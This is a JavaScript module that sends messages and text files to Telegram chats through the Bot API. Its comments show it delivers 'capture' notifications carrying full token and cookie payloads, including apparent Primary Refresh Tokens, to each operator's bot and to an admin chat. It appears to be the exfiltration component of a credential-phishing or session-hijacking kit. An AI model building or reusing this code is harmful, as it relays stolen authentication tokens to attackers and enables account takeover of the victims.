const axios = require('axios');
const db = require('../database/connection');

// Telegram hard limit per sendMessage request
const TELEGRAM_MAX_LEN = 4096;

/**
 * Send a Telegram notification to a user's configured chat.
 *
 * - Reads the user's telegram_id + telegram_bot_token from the DB.
 * - Respects the notify_prt preference (only sends when enabled).
 * - Uses HTML parse mode by default (matches capture notifications built
 *   with HTML <b>/<pre> tags).
 * - Auto-splits messages longer than Telegram's 4096-char limit into
 *   multiple sequentially-sent messages so full token/cookie payloads are
 *   never silently truncated.
 *
 * @param {number|string} userId
 * @param {string} message  HTML-formatted message
 * @param {object} [options]
 * @param {string} [options.parse_mode='HTML']
 * @param {boolean} [options.disable_web_preview=true]
 * @param {boolean} [options.requireNotifyPrt=true]  gate on users.notify_prt
 * @returns {Promise<boolean>} true if at least one chunk sent successfully
 */
async function sendTelegramNotification(userId, message, options = {}) {
  try {
    const {
      parse_mode = 'HTML',
      disable_web_preview = true,
      requireNotifyPrt = true,
    } = options;

    if (!message) return false;

    const [users] = await db.query(
      'SELECT telegram_id, telegram_bot_token, notify_prt FROM users WHERE id = ?',
      [userId]
    );
    if (!users.length) return false;

    const user = users[0];
    if (!user.telegram_id || !user.telegram_bot_token) return false;
    // Respect per-user notification preference (PRT/capture notifications)
    if (requireNotifyPrt && !user.notify_prt) return false;

    const chunks = chunkMessage(String(message), TELEGRAM_MAX_LEN);
    const url = `https://api.telegram.org/bot${user.telegram_bot_token}/sendMessage`;
    let anySent = false;

    for (const chunk of chunks) {
      try {
        await axios.post(url, {
          chat_id: user.telegram_id,
          text: chunk,
          parse_mode,
          disable_web_preview,
        });
        anySent = true;
      } catch (err) {
        // If HTML parsing fails (e.g. malformed tags from older callers),
        // retry this chunk without parse_mode so the message still delivers.
        if (parse_mode && err.response && err.response.status === 400) {
          try {
            await axios.post(url, {
              chat_id: user.telegram_id,
              text: chunk,
              disable_web_preview,
            });
            anySent = true;
            continue;
          } catch (retryErr) {
            console.error('[notification] Telegram fallback send failed:', retryErr.message);
          }
        }
        console.error('[notification] Telegram send failed:', err.message);
      }
    }

    return anySent;
  } catch (err) {
    console.error('[notification] sendTelegramNotification error:', err.message);
    return false;
  }
}

/**
 * Send a notification to the admin Telegram chat configured via env.
 * Uses HTML parse mode with the same chunking + fallback safety net.
 *
 * @param {string} message
 * @param {object} [options]
 * @param {string} [options.parse_mode='HTML']
 * @param {boolean} [options.disable_web_preview=true]
 * @returns {Promise<boolean>}
 */
async function sendAdminNotification(message, options = {}) {
  try {
    const { parse_mode = 'HTML', disable_web_preview = true } = options;
    const config = require('../config/env');
    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_ADMIN_CHAT_ID) return false;
    if (!message) return false;

    const chunks = chunkMessage(String(message), TELEGRAM_MAX_LEN);
    const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`;
    let anySent = false;

    for (const chunk of chunks) {
      try {
        await axios.post(url, {
          chat_id: config.TELEGRAM_ADMIN_CHAT_ID,
          text: chunk,
          parse_mode,
          disable_web_preview,
        });
        anySent = true;
      } catch (err) {
        if (parse_mode && err.response && err.response.status === 400) {
          try {
            await axios.post(url, {
              chat_id: config.TELEGRAM_ADMIN_CHAT_ID,
              text: chunk,
              disable_web_preview,
            });
            anySent = true;
            continue;
          } catch (retryErr) {
            console.error('[notification] Admin Telegram fallback send failed:', retryErr.message);
          }
        }
        console.error('[notification] Admin Telegram send failed:', err.message);
      }
    }

    return anySent;
  } catch (err) {
    console.error('[notification] sendAdminNotification error:', err.message);
    return false;
  }
}

/**
 * Split a message into chunks no longer than maxLen chars.
 * Splits on newline boundaries when possible to avoid cutting mid-HTML-tag
 * or mid-token; falls back to hard slicing if a single line exceeds maxLen.
 *
 * @param {string} text
 * @param {number} maxLen
 * @returns {string[]}
 */
function chunkMessage(text, maxLen) {
  if (text.length <= maxLen) return [text];

  const chunks = [];
  let remaining = text;

  while (remaining.length > 0) {
    if (remaining.length <= maxLen) {
      chunks.push(remaining);
      break;
    }

    let sliceEnd = remaining.lastIndexOf('\n', maxLen);
    if (sliceEnd <= 0) {
      // No newline within the window — try a space, else hard cut.
      sliceEnd = remaining.lastIndexOf(' ', maxLen);
      if (sliceEnd <= 0) sliceEnd = maxLen;
    }

    chunks.push(remaining.slice(0, sliceEnd));
    remaining = remaining.slice(sliceEnd).replace(/^\n/, '');
  }

  return chunks;
}

/**
 * Send a file (document) to a user's configured Telegram chat via the
 * Telegram `sendDocument` API. Used for long token/cookie payloads that
 * would otherwise exceed Telegram's 4096-char sendMessage limit.
 *
 * - Respects notify_prt preference (via options.requireNotifyPrt).
 * - caption is sent with the file (max 1024 chars per Telegram rules;
 *   longer captions are truncated automatically).
 * - caption_parse_mode defaults to 'HTML'.
 *
 * @param {number|string} userId
 * @param {string} filename   e.g. "capture_12_tokens.txt"
 * @param {string} fileContent  raw text content of the file
 * @param {string} caption     short HTML caption (summary)
 * @param {object} [options]
 * @param {string} [options.caption_parse_mode='HTML']
 * @param {boolean} [options.requireNotifyPrt=true]
 * @param {boolean} [options.disable_web_preview=true]
 * @returns {Promise<boolean>}
 */
async function sendTelegramDocument(userId, filename, fileContent, caption, options = {}) {
  try {
    const {
      caption_parse_mode = 'HTML',
      requireNotifyPrt = true,
      disable_web_preview = true,
    } = options;

    if (!filename || fileContent === undefined || fileContent === null) return false;

    const [users] = await db.query(
      'SELECT telegram_id, telegram_bot_token, notify_prt FROM users WHERE id = ?',
      [userId]
    );
    if (!users.length) return false;

    const user = users[0];
    if (!user.telegram_id || !user.telegram_bot_token) return false;
    if (requireNotifyPrt && !user.notify_prt) return false;

    // Telegram caption max is 1024 chars
    const safeCaption = caption ? String(caption).slice(0, 1024) : '';

    const url = `https://api.telegram.org/bot${user.telegram_bot_token}/sendDocument`;

    // Node 18+ has global FormData and Blob
    const form = new FormData();
    form.set('chat_id', user.telegram_id);
    form.set('document', new Blob([String(fileContent)], { type: 'text/plain' }), filename);
    if (safeCaption) {
      form.set('caption', safeCaption);
      form.set('parse_mode', caption_parse_mode);
    }
    if (disable_web_preview) form.set('disable_web_page_preview', 'true');

    await axios.post(url, form);
    return true;
  } catch (err) {
    console.error('[notification] sendTelegramDocument error:', err.message);
    return false;
  }
}

module.exports = { sendTelegramNotification, sendAdminNotification, sendTelegramDocument };
